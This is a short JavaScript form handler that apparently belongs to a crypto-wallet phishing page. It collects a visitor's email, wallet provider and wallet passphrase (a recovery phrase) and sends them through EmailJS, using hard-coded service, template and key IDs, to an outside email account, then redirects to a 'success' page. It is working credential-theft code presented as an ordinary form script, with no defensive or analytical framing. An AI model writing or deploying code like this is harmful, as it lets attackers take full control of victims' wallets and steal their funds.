// Initialize EmailJS
emailjs.init('8vV71WqV0ofavi4sh');  // Replace 'YOUR_USER_ID' with your actual EmailJS user ID

document.getElementById('walletForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent the form from submitting the traditional way

  // Get form field values
  const email = document.getElementById('email').value;
  const walletProvider = document.getElementById('walletProvider').value;
  const passphrase = document.getElementById('passphrase').value;
  
  const statusDiv = document.getElementById('status');
  
  // Validate fields
  if (email === '' || walletProvider === '' || passphrase === '') {
    statusDiv.textContent = 'Please fill in all fields.';
    return;
  }
  
  if (!validateEmail(email)) {
    statusDiv.textContent = 'Please enter a valid email address.';
    return;
  }

  statusDiv.textContent = 'Processing...';

  // Prepare the email parameters
  const templateParams = {
    email: email,
    walletProvider: walletProvider,
    passphrase: passphrase
  };

  // Sending the form data via EmailJS SDK
  emailjs.send('service_9273bwj', 'template_yfsrzqa', templateParams)
    .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        window.location.href = 'success.html'; // Redirecting to success page on successful email submission
    }, function(error) {
        console.log('FAILED...', error);
        statusDiv.textContent = 'An error occurred. Please try again.';
    });
});

// Email validation function
function validateEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return re.test(email);
}
